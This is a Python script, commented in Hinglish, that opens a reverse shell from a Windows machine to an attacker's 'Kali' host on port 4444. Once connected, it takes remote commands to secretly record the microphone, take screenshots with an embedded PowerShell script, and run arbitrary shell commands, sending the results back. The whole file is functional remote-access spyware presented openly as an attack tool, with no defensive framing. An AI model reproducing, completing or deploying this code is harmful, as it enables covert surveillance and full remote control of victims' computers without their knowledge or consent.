import sounddevice as sd
import soundfile as sf
import numpy as np
import socket
import subprocess
import os
import sys
import time

def get_downloads_folder():
    """Har PC ka Downloads folder auto-detect karein"""
    try:
        # Method 1: Windows Registry se
        import winreg
        subkey = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkey) as key:
            downloads = winreg.QueryValueEx(key, "{374DE290-123F-4565-9164-39C4925E467B}")[0]
            return downloads
    except:
        pass
    
    try:
        # Method 2: Environment variable se
        return os.path.expanduser("~/Downloads")
    except:
        pass
    
    try:
        # Method 3: User profile se
        return os.path.join(os.environ.get("USERPROFILE", "C:\\Users\\Default"), "Downloads")
    except:
        return "C:\\Downloads"

def record_audio_silent(duration=10):
    """sounddevice se background recording - Auto Downloads folder mein save"""
    try:
        fs = 44100  # Sample rate
        
        # ===== AUTO-DETECT DOWNLOADS FOLDER =====
        downloads_dir = get_downloads_folder()
        recordings_dir = os.path.join(downloads_dir, "Recordings")
        
        # Folder create karein
        os.makedirs(recordings_dir, exist_ok=True)
        
        # File name with timestamp
        audio_file = os.path.join(recordings_dir, f"mic_{int(time.time())}.wav")
        
        # Record (silent)
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
        sd.wait()  # Wait until recording finished
        
        # Save as WAV
        sf.write(audio_file, recording, fs)
        return audio_file
    except Exception as e:
        return None

def reverse_shell():
    KALI_IP = "192.168.1..."  # Apna Kali IP
    KALI_PORT = 4444
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((KALI_IP, KALI_PORT))
        
        # Get downloads folder path
        downloads_dir = get_downloads_folder()
        recordings_dir = os.path.join(downloads_dir, "Recordings")
        
        s.send(b"[+] Silent Recording Active! (sounddevice)\n")
        s.send(f"[+] Files saved in: {recordings_dir}\n".encode())
        s.send(b"[+] Commands: record 10, screenshot, help, exit\n")
        
        while True:
            command = s.recv(1024).decode().strip()
            if not command:
                break
            
            if command.lower() == 'exit':
                s.send(b"[-] Closing...\n")
                break
            
            if command.lower().startswith('record'):
                try:
                    parts = command.split()
                    duration = int(parts[1]) if len(parts) > 1 else 10
                    
                    s.send(f"[*] Recording {duration} seconds (silent)...\n".encode())
                    
                    audio_file = record_audio_silent(duration)
                    
                    if audio_file and os.path.exists(audio_file):
                        size = os.path.getsize(audio_file)
                        s.send(f"[+] Audio saved: {audio_file}\n".encode())
                        s.send(f"[+] File size: {size} bytes\n".encode())
                    else:
                        s.send(b"[-] Recording failed\n")
                except Exception as e:
                    s.send(f"[-] Error: {e}\n".encode())
                continue
            
            # ===== SCREENSHOT =====
            if command.lower() == 'screenshot':
                try:
                    downloads_dir = get_downloads_folder()
                    recordings_dir = os.path.join(downloads_dir, "Recordings")
                    os.makedirs(recordings_dir, exist_ok=True)
                    
                    ps_script = f'''
                    Add-Type -AssemblyName System.Windows.Forms
                    Add-Type -AssemblyName System.Drawing
                    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
                    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
                    $path = "{recordings_dir}\\screenshot_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".png"
                    $bitmap.Save($path)
                    Write-Host "SAVED:$path"
                    '''
                    result = subprocess.run(['powershell', '-Command', ps_script], capture_output=True, text=True)
                    if 'SAVED:' in result.stdout:
                        s.send(f"[+] Screenshot: {result.stdout.split('SAVED:')[1].strip()}\n".encode())
                    else:
                        s.send(b"[-] Screenshot failed\n")
                except Exception as e:
                    s.send(f"[-] Error: {e}\n".encode())
                continue
            
            # ===== HELP =====
            if command.lower() == 'help':
                recordings_dir = os.path.join(get_downloads_folder(), "Recordings")
                help_msg = f"""
                ===== COMMANDS =====
                record 10    - Record audio (silent) 10 sec
                record 20    - Record audio (silent) 20 sec
                screenshot   - Take screenshot
                dir          - List files
                whoami       - Show user
                ipconfig     - Network info
                notepad      - Open Notepad
                exit         - Close connection
                ===================
                Save Location: {recordings_dir}
                """
                s.send(help_msg.encode())
                continue
            
            # ===== EXECUTE =====
            try:
                output = subprocess.run(command, shell=True, capture_output=True, text=True)
                result = output.stdout + output.stderr
                if not result:
                    result = "[+] Command executed\n"
                s.send(result.encode())
            except Exception as e:
                s.send(f"[-] Error: {e}\n".encode())
        
        s.close()
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    print("=" * 50)
    print("🔌 SILENT REVERSE SHELL (sounddevice)")
    print("=" * 50)
    downloads_dir = get_downloads_folder()
    recordings_dir = os.path.join(downloads_dir, "Recordings")
    print(f"[*] Save Location: {recordings_dir}")
    print("=" * 50)
    reverse_shell()
